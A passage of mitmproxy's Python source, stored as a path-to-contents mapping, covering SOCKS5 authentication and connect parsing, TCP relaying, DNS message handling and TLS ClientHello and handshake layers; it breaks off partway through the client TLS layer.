self.context.options.proxyauth:\n            method = SOCKS5_METHOD_USER_PASSWORD_AUTHENTICATION\n            self.state = self.state_auth\n        else:\n            method = SOCKS5_METHOD_NO_AUTHENTICATION_REQUIRED\n            self.state = self.state_connect\n\n        if method not in self.buf[2 : 2 + n_methods]:\n            method_str = (\n                \"user/password\"\n                if method == SOCKS5_METHOD_USER_PASSWORD_AUTHENTICATION\n                else \"no\"\n            )\n            yield from self.socks_err(\n                f\"Client does not support SOCKS5 with {method_str} authentication.\",\n                SOCKS5_METHOD_NO_ACCEPTABLE_METHODS,\n            )\n            return\n        yield commands.SendData(self.context.client, bytes([SOCKS5_VERSION, method]))\n        self.buf = self.buf[2 + n_methods :]\n        yield from self.state()\n\n    state: Callable[..., layer.CommandGenerator[None]] = state_greet\n\n    def state_auth(self) -> layer.CommandGenerator[None]:\n        if len(self.buf) < 3:\n            return\n\n        # Parsing username and password, which is somewhat atrocious\n        user_len = self.buf[1]\n        if len(self.buf) < 3 + user_len:\n            return\n        pass_len = self.buf[2 + user_len]\n        if len(self.buf) < 3 + user_len + pass_len:\n            return\n        user = self.buf[2 : (2 + user_len)].decode(\"utf-8\", \"backslashreplace\")\n        password = self.buf[(3 + user_len) : (3 + user_len + pass_len)].decode(\n            \"utf-8\", \"backslashreplace\"\n        )\n\n        data = Socks5AuthData(self.context.client, user, password)\n        yield Socks5AuthHook(data)\n        if not data.valid:\n            # The VER field contains the current **version of the subnegotiation**, which is X'01'.\n            yield commands.SendData(self.context.client, b\"\\x01\\x01\")\n            yield from self.socks_err(\"authentication failed\")\n            return\n\n        yield commands.SendData(self.context.client, b\"\\x01\\x00\")\n        self.buf = self.buf[3 + user_len + pass_len :]\n        self.state = self.state_connect\n        yield from self.state()\n\n    def state_connect(self) -> layer.CommandGenerator[None]:\n        # Parse Connect Request\n        if len(self.buf) < 5:\n            return\n\n        if self.buf[:3] != b\"\\x05\\x01\\x00\":\n            yield from self.socks_err(\n                f\"Unsupported SOCKS5 request: {self.buf!r}\",\n                SOCKS5_REP_COMMAND_NOT_SUPPORTED,\n            )\n            return\n\n        # Determine message length\n        atyp = self.buf[3]\n        message_len: int\n        if atyp == SOCKS5_ATYP_IPV4_ADDRESS:\n            message_len = 4 + 4 + 2\n        elif atyp == SOCKS5_ATYP_IPV6_ADDRESS:\n            message_len = 4 + 16 + 2\n        elif atyp == SOCKS5_ATYP_DOMAINNAME:\n            message_len = 4 + 1 + self.buf[4] + 2\n        else:\n            yield from self.socks_err(\n                f\"Unknown address type: {atyp}\", SOCKS5_REP_ADDRESS_TYPE_NOT_SUPPORTED\n            )\n            return\n\n        # Do we have enough bytes yet?\n        if len(self.buf) < message_len:\n            return\n\n        # Parse host and port\n        msg, self.buf = self.buf[:message_len], self.buf[message_len:]\n\n        host: str\n        if atyp == SOCKS5_ATYP_IPV4_ADDRESS:\n            host = socket.inet_ntop(socket.AF_INET, msg[4:-2])\n        elif atyp == SOCKS5_ATYP_IPV6_ADDRESS:\n            host = socket.inet_ntop(socket.AF_INET6, msg[4:-2])\n        else:\n            host_bytes = msg[5:-2]\n            host = host_bytes.decode(\"ascii\", \"replace\")\n\n        (port,) = struct.unpack(\"!H\", msg[-2:])\n\n        # We now have all we need, let's get going.\n        self.context.server.address = (host, port)\n        self.child_layer = layer.NextLayer(self.context)\n\n        # this already triggers the child layer's Start event,\n        # but that's not a problem in practice...\n        err = yield from self.finish_start()\n        if err:\n            yield commands.SendData(\n                self.context.client, b\"\\x05\\x04\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"\n            )\n            yield commands.CloseConnection(self.context.client)\n        else:\n            yield commands.SendData(\n                self.context.client, b\"\\x05\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"\n            )\n            if self.buf:\n                yield from self.child_layer.handle_event(\n                    events.DataReceived(self.context.client, self.buf)\n                )\n                del self.buf\n", "mitmproxy/proxy/layers/tcp.py": "from dataclasses import dataclass\n\nfrom mitmproxy import flow\nfrom mitmproxy import tcp\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.connection import ConnectionState\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.commands import StartHook\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.events import MessageInjected\nfrom mitmproxy.proxy.utils import expect\n\n\n@dataclass\nclass TcpStartHook(StartHook):\n    \"\"\"\n    A TCP connection has started.\n    \"\"\"\n\n    flow: tcp.TCPFlow\n\n\n@dataclass\nclass TcpMessageHook(StartHook):\n    \"\"\"\n    A TCP connection has received a message. The most recent message\n    will be flow.messages[-1]. The message is user-modifiable.\n    \"\"\"\n\n    flow: tcp.TCPFlow\n\n\n@dataclass\nclass TcpEndHook(StartHook):\n    \"\"\"\n    A TCP connection has ended.\n    \"\"\"\n\n    flow: tcp.TCPFlow\n\n\n@dataclass\nclass TcpErrorHook(StartHook):\n    \"\"\"\n    A TCP error has occurred.\n\n    Every TCP flow will receive either a tcp_error or a tcp_end event, but not both.\n    \"\"\"\n\n    flow: tcp.TCPFlow\n\n\nclass TcpMessageInjected(MessageInjected[tcp.TCPMessage]):\n    \"\"\"\n    The user has injected a custom TCP message.\n    \"\"\"\n\n\nclass TCPLayer(layer.Layer):\n    \"\"\"\n    Simple TCP layer that just relays messages right now.\n    \"\"\"\n\n    flow: tcp.TCPFlow | None\n\n    def __init__(self, context: Context, ignore: bool = False):\n        super().__init__(context)\n        if ignore:\n            self.flow = None\n        else:\n            self.flow = tcp.TCPFlow(self.context.client, self.context.server, True)\n\n    @expect(events.Start)\n    def start(self, _) -> layer.CommandGenerator[None]:\n        if self.flow:\n            yield TcpStartHook(self.flow)\n\n        if self.context.server.timestamp_start is None:\n            err = yield commands.OpenConnection(self.context.server)\n            if err:\n                if self.flow:\n                    self.flow.error = flow.Error(str(err))\n                    yield TcpErrorHook(self.flow)\n                yield commands.CloseConnection(self.context.client)\n                self._handle_event = self.done\n                return\n        self._handle_event = self.relay_messages\n\n    _handle_event = start\n\n    @expect(events.DataReceived, events.ConnectionClosed, TcpMessageInjected)\n    def relay_messages(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if isinstance(event, TcpMessageInjected):\n            # we just spoof that we received data here and then process that regularly.\n            event = events.DataReceived(\n                self.context.client\n                if event.message.from_client\n                else self.context.server,\n                event.message.content,\n            )\n\n        assert isinstance(event, events.ConnectionEvent)\n\n        from_client = event.connection == self.context.client\n        send_to: Connection\n        if from_client:\n            send_to = self.context.server\n        else:\n            send_to = self.context.client\n\n        if isinstance(event, events.DataReceived):\n            if self.flow:\n                tcp_message = tcp.TCPMessage(from_client, event.data)\n                self.flow.messages.append(tcp_message)\n                yield TcpMessageHook(self.flow)\n                yield commands.SendData(send_to, tcp_message.content)\n            else:\n                yield commands.SendData(send_to, event.data)\n\n        elif isinstance(event, events.ConnectionClosed):\n            all_done = not (\n                (self.context.client.state & ConnectionState.CAN_READ)\n                or (self.context.server.state & ConnectionState.CAN_READ)\n            )\n            if all_done:\n                self._handle_event = self.done\n                if self.context.server.state is not ConnectionState.CLOSED:\n                    yield commands.CloseConnection(self.context.server)\n                if self.context.client.state is not ConnectionState.CLOSED:\n                    yield commands.CloseConnection(self.context.client)\n                if self.flow:\n                    yield TcpEndHook(self.flow)\n                    self.flow.live = False\n            else:\n                yield commands.CloseTcpConnection(send_to, half_close=True)\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n    @expect(events.DataReceived, events.ConnectionClosed, TcpMessageInjected)\n    def done(self, _) -> layer.CommandGenerator[None]:\n        yield from ()\n", "mitmproxy/proxy/layers/dns.py": "import struct\nfrom dataclasses import dataclass\nfrom typing import List\nfrom typing import Literal\n\nfrom mitmproxy import dns\nfrom mitmproxy import flow as mflow\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.utils import expect\n\n_LENGTH_LABEL = struct.Struct(\"!H\")\n\n\n@dataclass\nclass DnsRequestHook(commands.StartHook):\n    \"\"\"\n    A DNS query has been received.\n    \"\"\"\n\n    flow: dns.DNSFlow\n\n\n@dataclass\nclass DnsResponseHook(commands.StartHook):\n    \"\"\"\n    A DNS response has been received or set.\n    \"\"\"\n\n    flow: dns.DNSFlow\n\n\n@dataclass\nclass DnsErrorHook(commands.StartHook):\n    \"\"\"\n    A DNS error has occurred.\n    \"\"\"\n\n    flow: dns.DNSFlow\n\n\ndef pack_message(\n    message: dns.Message, transport_protocol: Literal[\"tcp\", \"udp\"]\n) -> bytes:\n    packed = message.packed\n    if transport_protocol == \"tcp\":\n        return struct.pack(\"!H\", len(packed)) + packed\n    else:\n        return packed\n\n\nclass DNSLayer(layer.Layer):\n    \"\"\"\n    Layer that handles resolving DNS queries.\n    \"\"\"\n\n    flows: dict[int, dns.DNSFlow]\n    req_buf: bytearray\n    resp_buf: bytearray\n\n    def __init__(self, context: Context):\n        super().__init__(context)\n        self.flows = {}\n        self.req_buf = bytearray()\n        self.resp_buf = bytearray()\n\n    def handle_request(\n        self, flow: dns.DNSFlow, msg: dns.Message\n    ) -> layer.CommandGenerator[None]:\n        flow.request = msg  # if already set, continue and query upstream again\n        yield DnsRequestHook(flow)\n        if flow.response:\n            yield from self.handle_response(flow, flow.response)\n        elif not self.context.server.address:\n            yield from self.handle_error(\n                flow, \"No hook has set a response and there is no upstream server.\"\n            )\n        else:\n            if not self.context.server.connected:\n                err = yield commands.OpenConnection(self.context.server)\n                if err:\n                    yield from self.handle_error(flow, str(err))\n                    # cannot recover from this\n                    return\n            packed = pack_message(flow.request, flow.server_conn.transport_protocol)\n            yield commands.SendData(self.context.server, packed)\n\n    def handle_response(\n        self, flow: dns.DNSFlow, msg: dns.Message\n    ) -> layer.CommandGenerator[None]:\n        flow.response = msg\n        yield DnsResponseHook(flow)\n        if flow.response:\n            packed = pack_message(flow.response, flow.client_conn.transport_protocol)\n            yield commands.SendData(self.context.client, packed)\n\n    def handle_error(self, flow: dns.DNSFlow, err: str) -> layer.CommandGenerator[None]:\n        flow.error = mflow.Error(err)\n        yield DnsErrorHook(flow)\n\n    def unpack_message(self, data: bytes, from_client: bool) -> List[dns.Message]:\n        msgs: List[dns.Message] = []\n\n        buf = self.req_buf if from_client else self.resp_buf\n\n        if self.context.client.transport_protocol == \"udp\":\n            msgs.append(dns.Message.unpack(data))\n        elif self.context.client.transport_protocol == \"tcp\":\n            buf.extend(data)\n            size = len(buf)\n            offset = 0\n\n            while True:\n                if size - offset < _LENGTH_LABEL.size:\n                    break\n                (expected_size,) = _LENGTH_LABEL.unpack_from(buf, offset)\n                offset += _LENGTH_LABEL.size\n                if expected_size == 0:\n                    raise struct.error(\"Message length field cannot be zero\")\n\n                if size - offset < expected_size:\n                    offset -= _LENGTH_LABEL.size\n                    break\n\n                data = bytes(buf[offset : expected_size + offset])\n                offset += expected_size\n                msgs.append(dns.Message.unpack(data))\n                expected_size = 0\n\n            del buf[:offset]\n        return msgs\n\n    @expect(events.Start)\n    def state_start(self, _) -> layer.CommandGenerator[None]:\n        self._handle_event = self.state_query\n        yield from ()\n\n    @expect(events.DataReceived, events.ConnectionClosed)\n    def state_query(self, event: events.Event) -> layer.CommandGenerator[None]:\n        assert isinstance(event, events.ConnectionEvent)\n        from_client = event.connection is self.context.client\n\n        if isinstance(event, events.DataReceived):\n            msgs: List[dns.Message] = []\n            try:\n                msgs = self.unpack_message(event.data, from_client)\n            except struct.error as e:\n                yield commands.Log(f\"{event.connection} sent an invalid message: {e}\")\n                yield commands.CloseConnection(event.connection)\n                self._handle_event = self.state_done\n            else:\n                for msg in msgs:\n                    try:\n                        flow = self.flows[msg.id]\n                    except KeyError:\n                        flow = dns.DNSFlow(\n                            self.context.client, self.context.server, live=True\n                        )\n                        self.flows[msg.id] = flow\n                    if from_client:\n                        yield from self.handle_request(flow, msg)\n                    else:\n                        yield from self.handle_response(flow, msg)\n\n        elif isinstance(event, events.ConnectionClosed):\n            other_conn = self.context.server if from_client else self.context.client\n            if other_conn.connected:\n                yield commands.CloseConnection(other_conn)\n            self._handle_event = self.state_done\n            for flow in self.flows.values():\n                flow.live = False\n\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n    @expect(events.DataReceived, events.ConnectionClosed)\n    def state_done(self, _) -> layer.CommandGenerator[None]:\n        yield from ()\n\n    _handle_event = state_start\n", "mitmproxy/proxy/layers/tls.py": "import struct\nimport time\nfrom collections.abc import Iterator\nfrom dataclasses import dataclass\nfrom logging import DEBUG\nfrom logging import ERROR\nfrom logging import INFO\nfrom logging import WARNING\n\nfrom OpenSSL import SSL\n\nfrom mitmproxy import certs\nfrom mitmproxy import connection\nfrom mitmproxy.net.tls import starts_like_dtls_record\nfrom mitmproxy.net.tls import starts_like_tls_record\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import context\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy import tunnel\nfrom mitmproxy.proxy.commands import StartHook\nfrom mitmproxy.proxy.layers import tcp\nfrom mitmproxy.proxy.layers import udp\nfrom mitmproxy.tls import ClientHello\nfrom mitmproxy.tls import ClientHelloData\nfrom mitmproxy.tls import TlsData\nfrom mitmproxy.utils import human\n\n\ndef handshake_record_contents(data: bytes) -> Iterator[bytes]:\n    \"\"\"\n    Returns a generator that yields the bytes contained in each handshake record.\n    This will raise an error on the first non-handshake record, so fully exhausting this\n    generator is a bad idea.\n    \"\"\"\n    offset = 0\n    while True:\n        if len(data) < offset + 5:\n            return\n        record_header = data[offset : offset + 5]\n        if not starts_like_tls_record(record_header):\n            raise ValueError(f\"Expected TLS record, got {record_header!r} instead.\")\n        record_size = struct.unpack(\"!H\", record_header[3:])[0]\n        if record_size == 0:\n            raise ValueError(\"Record must not be empty.\")\n        offset += 5\n\n        if len(data) < offset + record_size:\n            return\n        record_body = data[offset : offset + record_size]\n        yield record_body\n        offset += record_size\n\n\ndef get_client_hello(data: bytes) -> bytes | None:\n    \"\"\"\n    Read all TLS records that contain the initial ClientHello.\n    Returns the raw handshake packet bytes, without TLS record headers.\n    \"\"\"\n    client_hello = b\"\"\n    for d in handshake_record_contents(data):\n        client_hello += d\n        if len(client_hello) >= 4:\n            client_hello_size = struct.unpack(\"!I\", b\"\\x00\" + client_hello[1:4])[0] + 4\n            if len(client_hello) >= client_hello_size:\n                return client_hello[:client_hello_size]\n    return None\n\n\ndef parse_client_hello(data: bytes) -> ClientHello | None:\n    \"\"\"\n    Check if the supplied bytes contain a full ClientHello message,\n    and if so, parse it.\n\n    Returns:\n        - A ClientHello object on success\n        - None, if the TLS record is not complete\n\n    Raises:\n        - A ValueError, if the passed ClientHello is invalid\n    \"\"\"\n    # Check if ClientHello is complete\n    client_hello = get_client_hello(data)\n    if client_hello:\n        try:\n            return ClientHello(client_hello[4:])\n        except EOFError as e:\n            raise ValueError(\"Invalid ClientHello\") from e\n    return None\n\n\ndef dtls_handshake_record_contents(data: bytes) -> Iterator[bytes]:\n    \"\"\"\n    Returns a generator that yields the bytes contained in each handshake record.\n    This will raise an error on the first non-handshake record, so fully exhausting this\n    generator is a bad idea.\n    \"\"\"\n    offset = 0\n    while True:\n        # DTLS includes two new fields, totaling 8 bytes, between Version and Length\n        if len(data) < offset + 13:\n            return\n        record_header = data[offset : offset + 13]\n        if not starts_like_dtls_record(record_header):\n            raise ValueError(f\"Expected DTLS record, got {record_header!r} instead.\")\n        # Length fields starts at 11\n        record_size = struct.unpack(\"!H\", record_header[11:])[0]\n        if record_size == 0:\n            raise ValueError(\"Record must not be empty.\")\n        offset += 13\n\n        if len(data) < offset + record_size:\n            return\n        record_body = data[offset : offset + record_size]\n        yield record_body\n        offset += record_size\n\n\ndef get_dtls_client_hello(data: bytes) -> bytes | None:\n    \"\"\"\n    Read all DTLS records that contain the initial ClientHello.\n    Returns the raw handshake packet bytes, without TLS record headers.\n    \"\"\"\n    client_hello = b\"\"\n    for d in dtls_handshake_record_contents(data):\n        client_hello += d\n        if len(client_hello) >= 13:\n            # comment about slicing: we skip the epoch and sequence number\n            client_hello_size = (\n                struct.unpack(\"!I\", b\"\\x00\" + client_hello[9:12])[0] + 12\n            )\n            if len(client_hello) >= client_hello_size:\n                return client_hello[:client_hello_size]\n    return None\n\n\ndef dtls_parse_client_hello(data: bytes) -> ClientHello | None:\n    \"\"\"\n    Check if the supplied bytes contain a full ClientHello message,\n    and if so, parse it.\n\n    Returns:\n        - A ClientHello object on success\n        - None, if the TLS record is not complete\n\n    Raises:\n        - A ValueError, if the passed ClientHello is invalid\n    \"\"\"\n    # Check if ClientHello is complete\n    client_hello = get_dtls_client_hello(data)\n    if client_hello:\n        try:\n            return ClientHello(client_hello[12:], dtls=True)\n        except EOFError as e:\n            raise ValueError(\"Invalid ClientHello\") from e\n    return None\n\n\nHTTP1_ALPNS = (b\"http/1.1\", b\"http/1.0\", b\"http/0.9\")\nHTTP_ALPNS = (b\"h2\",) + HTTP1_ALPNS\n\n\n# We need these classes as hooks can only have one argument at the moment.\n\n\n@dataclass\nclass TlsClienthelloHook(StartHook):\n    \"\"\"\n    Mitmproxy has received a TLS ClientHello message.\n\n    This hook decides whether a server connection is needed\n    to negotiate TLS with the client (data.establish_server_tls_first)\n    \"\"\"\n\n    data: ClientHelloData\n\n\n@dataclass\nclass TlsStartClientHook(StartHook):\n    \"\"\"\n    TLS negotation between mitmproxy and a client is about to start.\n\n    An addon is expected to initialize data.ssl_conn.\n    (by default, this is done by `mitmproxy.addons.tlsconfig`)\n    \"\"\"\n\n    data: TlsData\n\n\n@dataclass\nclass TlsStartServerHook(StartHook):\n    \"\"\"\n    TLS negotation between mitmproxy and a server is about to start.\n\n    An addon is expected to initialize data.ssl_conn.\n    (by default, this is done by `mitmproxy.addons.tlsconfig`)\n    \"\"\"\n\n    data: TlsData\n\n\n@dataclass\nclass TlsEstablishedClientHook(StartHook):\n    \"\"\"\n    The TLS handshake with the client has been completed successfully.\n    \"\"\"\n\n    data: TlsData\n\n\n@dataclass\nclass TlsEstablishedServerHook(StartHook):\n    \"\"\"\n    The TLS handshake with the server has been completed successfully.\n    \"\"\"\n\n    data: TlsData\n\n\n@dataclass\nclass TlsFailedClientHook(StartHook):\n    \"\"\"\n    The TLS handshake with the client has failed.\n    \"\"\"\n\n    data: TlsData\n\n\n@dataclass\nclass TlsFailedServerHook(StartHook):\n    \"\"\"\n    The TLS handshake with the server has failed.\n    \"\"\"\n\n    data: TlsData\n\n\nclass TLSLayer(tunnel.TunnelLayer):\n    tls: SSL.Connection = None  # type: ignore\n    \"\"\"The OpenSSL connection object\"\"\"\n\n    def __init__(self, context: context.Context, conn: connection.Connection):\n        super().__init__(\n            context,\n            tunnel_connection=conn,\n            conn=conn,\n        )\n\n        conn.tls = True\n\n    def __repr__(self):\n        return (\n            super().__repr__().replace(\")\", f\" {self.conn.sni!r} {self.conn.alpn!r})\")\n        )\n\n    @property\n    def is_dtls(self):\n        return self.conn.transport_protocol == \"udp\"\n\n    @property\n    def proto_name(self):\n        return \"DTLS\" if self.is_dtls else \"TLS\"\n\n    def start_tls(self) -> layer.CommandGenerator[None]:\n        assert not self.tls\n\n        tls_start = TlsData(self.conn, self.context, is_dtls=self.is_dtls)\n        if self.conn == self.context.client:\n            yield TlsStartClientHook(tls_start)\n        else:\n            yield TlsStartServerHook(tls_start)\n        if not tls_start.ssl_conn:\n            yield commands.Log(\n                f\"No {self.proto_name} context was provided, failing connection.\", ERROR\n            )\n            yield commands.CloseConnection(self.conn)\n            return\n        assert tls_start.ssl_conn\n        self.tls = tls_start.ssl_conn\n\n    def tls_interact(self) -> layer.CommandGenerator[None]:\n        while True:\n            try:\n                data = self.tls.bio_read(65535)\n            except SSL.WantReadError:\n                return  # Okay, nothing more waiting to be sent.\n            else:\n                yield commands.SendData(self.conn, data)\n\n    def receive_handshake_data(\n        self, data: bytes\n    ) -> layer.CommandGenerator[tuple[bool, str | None]]:\n        # bio_write errors for b\"\", so we need to check first if we actually received something.\n        if data:\n            self.tls.bio_write(data)\n        try:\n            self.tls.do_handshake()\n        except SSL.WantReadError:\n            yield from self.tls_interact()\n            return False, None\n        except SSL.Error as e:\n            # provide more detailed information for some errors.\n            last_err = (\n                e.args and isinstance(e.args[0], list) and e.args[0] and e.args[0][-1]\n            )\n            if last_err in [\n                (\n                    \"SSL routines\",\n                    \"tls_process_server_certificate\",\n                    \"certificate verify failed\",\n                ),\n                (\"SSL routines\", \"\", \"certificate verify failed\"),  # OpenSSL 3+\n            ]:\n                verify_result = SSL._lib.SSL_get_verify_result(self.tls._ssl)  # type: ignore\n                error = SSL._ffi.string(  # type: ignore\n                    SSL._lib.X509_verify_cert_error_string(verify_result)  # type: ignore\n                ).decode()\n                err = f\"Certificate verify failed: {error}\"\n            elif last_err in [\n                (\"SSL routines\", \"ssl3_read_bytes\", \"tlsv1 alert unknown ca\"),\n                (\"SSL routines\", \"ssl3_read_bytes\", \"sslv3 alert bad certificate\"),\n                (\"SSL routines\", \"ssl3_read_bytes\", \"ssl/tls alert bad certificate\"),\n                (\"SSL routines\", \"\", \"tlsv1 alert unknown ca\"),  # OpenSSL 3+\n                (\"SSL routines\", \"\", \"sslv3 alert bad certificate\"),  # OpenSSL 3+\n                (\"SSL routines\", \"\", \"ssl/tls alert bad certificate\"),  # OpenSSL 3.2+\n            ]:\n                assert isinstance(last_err, tuple)\n                err = last_err[2]\n            elif (\n                last_err\n                in [\n                    (\"SSL routines\", \"ssl3_get_record\", \"wrong version number\"),\n                    (\"SSL routines\", \"\", \"wrong version number\"),  # OpenSSL 3+\n                    (\"SSL routines\", \"\", \"packet length too long\"),  # OpenSSL 3+\n                    (\"SSL routines\", \"\", \"record layer failure\"),  # OpenSSL 3+\n                ]\n                and data[:4].isascii()\n            ):\n                err = f\"The remote server does not speak TLS.\"\n            elif last_err in [\n                (\"SSL routines\", \"ssl3_read_bytes\", \"tlsv1 alert protocol version\"),\n                (\"SSL routines\", \"\", \"tlsv1 alert protocol version\"),  # OpenSSL 3+\n            ]:\n                err = (\n                    f\"The remote server and mitmproxy cannot agree on a TLS version to use. \"\n                    f\"You may need to adjust mitmproxy's tls_version_server_min option.\"\n                )\n            else:\n                err = f\"OpenSSL {e!r}\"\n            return False, err\n        else:\n            # Here we set all attributes that are only known *after* the handshake.\n\n            # Get all peer certificates.\n            # https://www.openssl.org/docs/man1.1.1/man3/SSL_get_peer_cert_chain.html\n            # If called on the client side, the stack also contains the peer's certificate; if called on the server\n            # side, the peer's certificate must be obtained separately using SSL_get_peer_certificate(3).\n            all_certs = self.tls.get_peer_cert_chain() or []\n            if self.conn == self.context.client:\n                cert = self.tls.get_peer_certificate()\n                if cert:\n                    all_certs.insert(0, cert)\n\n            self.conn.timestamp_tls_setup = time.time()\n            self.conn.alpn = self.tls.get_alpn_proto_negotiated()\n            self.conn.certificate_list = [\n                certs.Cert.from_pyopenssl(x) for x in all_certs\n            ]\n            self.conn.cipher = self.tls.get_cipher_name()\n            self.conn.tls_version = self.tls.get_protocol_version_name()\n            if self.debug:\n                yield commands.Log(\n                    f\"{self.debug}[tls] tls established: {self.conn}\", DEBUG\n                )\n            if self.conn == self.context.client:\n                yield TlsEstablishedClientHook(\n                    TlsData(self.conn, self.context, self.tls)\n                )\n            else:\n                yield TlsEstablishedServerHook(\n                    TlsData(self.conn, self.context, self.tls)\n                )\n            yield from self.receive_data(b\"\")\n            return True, None\n\n    def on_handshake_error(self, err: str) -> layer.CommandGenerator[None]:\n        self.conn.error = err\n        if self.conn == self.context.client:\n            yield TlsFailedClientHook(TlsData(self.conn, self.context, self.tls))\n        else:\n            yield TlsFailedServerHook(TlsData(self.conn, self.context, self.tls))\n        yield from super().on_handshake_error(err)\n\n    def receive_data(self, data: bytes) -> layer.CommandGenerator[None]:\n        if data:\n            self.tls.bio_write(data)\n        yield from self.tls_interact()\n\n        plaintext = bytearray()\n        close = False\n        while True:\n            try:\n                plaintext.extend(self.tls.recv(65535))\n            except SSL.WantReadError:\n                break\n            except SSL.ZeroReturnError:\n                close = True\n                break\n            except SSL.Error as e:\n                # This may be happening because the other side send an alert.\n                # There's somewhat ugly behavior with Firefox on Android here,\n                # which upon mistrusting a certificate still completes the handshake\n                # and then sends an alert in the next packet. At this point we have unfortunately\n                # already fired out `tls_established_client` hook.\n                yield commands.Log(f\"TLS Error: {e}\", WARNING)\n                break\n        if plaintext:\n            yield from self.event_to_child(\n                events.DataReceived(self.conn, bytes(plaintext))\n            )\n        if close:\n            self.conn.state &= ~connection.ConnectionState.CAN_READ\n            if self.debug:\n                yield commands.Log(f\"{self.debug}[tls] close_notify {self.conn}\", DEBUG)\n            yield from self.event_to_child(events.ConnectionClosed(self.conn))\n\n    def receive_close(self) -> layer.CommandGenerator[None]:\n        if self.tls.get_shutdown() & SSL.RECEIVED_SHUTDOWN:\n            pass  # We have already dispatched a ConnectionClosed to the child layer.\n        else:\n            yield from super().receive_close()\n\n    def send_data(self, data: bytes) -> layer.CommandGenerator[None]:\n        try:\n            self.tls.sendall(data)\n        except (SSL.ZeroReturnError, SSL.SysCallError):\n            # The other peer may still be trying to send data over, which we discard here.\n            pass\n        yield from self.tls_interact()\n\n    def send_close(\n        self, command: commands.CloseConnection\n    ) -> layer.CommandGenerator[None]:\n        # We should probably shutdown the TLS connection properly here.\n        yield from super().send_close(command)\n\n\nclass ServerTLSLayer(TLSLayer):\n    \"\"\"\n    This layer establishes TLS for a single server connection.\n    \"\"\"\n\n    wait_for_clienthello: bool = False\n\n    def __init__(self, context: context.Context, conn: connection.Server | None = None):\n        super().__init__(context, conn or context.server)\n\n    def start_handshake(self) -> layer.CommandGenerator[None]:\n        wait_for_clienthello = (\n            # if command_to_reply_to is set, we've been instructed to open the connection from the child layer.\n            # in that case any potential ClientHello is already parsed (by the ClientTLS child layer).\n            not self.command_to_reply_to\n            # if command_to_reply_to is not set, the connection was already open when this layer received its Start\n            # event (eager connection strategy). We now want to establish TLS right away, _unless_ we already know\n            # that there's TLS on the client side as well (we check if our immediate child layer is set to be ClientTLS)\n            # In this case want to wait for ClientHello to be parsed, so that we can incorporate SNI/ALPN from there.\n            and isinstance(self.child_layer, ClientTLSLayer)\n        )\n        if wait_for_clienthello:\n            self.wait_for_clienthello = True\n            self.tunnel_state = tunnel.TunnelState.CLOSED\n        else:\n            yield from self.start_tls()\n            if self.tls:\n                yield from self.receive_handshake_data(b\"\")\n\n    def event_to_child(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if self.wait_for_clienthello:\n            for command in super().event_to_child(event):\n                if (\n                    isinstance(command, commands.OpenConnection)\n                    and command.connection == self.conn\n                ):\n                    self.wait_for_clienthello = False\n                    # swallow OpenConnection here by not re-yielding it.\n                else:\n                    yield command\n        else:\n            yield from super().event_to_child(event)\n\n    def on_handshake_error(self, err: str) -> layer.CommandGenerator[None]:\n        yield commands.Log(f\"Server TLS handshake failed. {err}\", level=WARNING)\n        yield from super().on_handshake_error(err)\n\n\nclass ClientTLSLayer(TLSLayer):\n    \"\"\"\n    This layer establishes TLS on a single client connection.\n\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502Start\u2502\n    \u2514\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2193\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502Wait for ClientHello\u2502\n    \u2514\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2193\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502Process messages\u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    \"\"\"\n\n    recv_buffer: bytearray\n    server_tls_available: bool\n    client_hello_parsed: bool = False\n\n    def __init__(self, context: context.Context):\n        if context.client.tls:\n            # In the case of TLS-over-TLS, we already have client TLS. As the outer TLS connection between client\n            # and proxy isn't that interesting to us, we just unset the attributes here and keep the inner TLS\n            # session's attributes.\n            # Alternatively we could create a new Client instance,\n            # but for now we keep it simple. There is a proof-of-concept at\n            # https://github.com/mitmproxy/mitmproxy/commit/9b6e2a716888b7787514733b76a5936afa485352.\n            context.client.alpn = None\n            context.client.cipher = None\n            context.client.sni = None\n            context.client.timestamp_tls_setup = None\n            context.client.tls_version = None\n            context.client.certificate_list = []\n            context.client.mitmcert = None\n            context.client.alpn_offers = []\n            context.client.cipher_list = []\n\n        super().__init__(context, context.client)\n        self.server_tls_available = isinstance(self.context.layers[-2], ServerTLSLayer)\n        self.recv_buffer = bytearray()\n\n    def start_handshake(self) -> layer.CommandGenerator[None]:\n        yield from ()\n\n    def receive_handshake_data(\n        self, data: bytes\n    ) -> layer.CommandGenerator[tuple[bool, str | None]]:\n        if self.client_hello_parsed:\n            return (yield from super().receive_handshake_data(data))\n        self.recv_buffer.extend(data)\n        try:\n            if self.is_dtls:\n                client_hello = dtls_parse_client_hello(self.recv_buffer)\n            else:\n                client_hello = parse_client_hello(self.recv_buffer)\n        except ValueError:\n            return False, f\"Cannot parse ClientHello: {self.recv_buffer.hex()}\"\n\n        if client_hello:\n            self.client_hello_parsed = True\n        else:\n            return False, None\n\n        self.conn.sni = client_hello.sni\n        self.conn.alpn_offers = client_hello.alpn_protocols\n        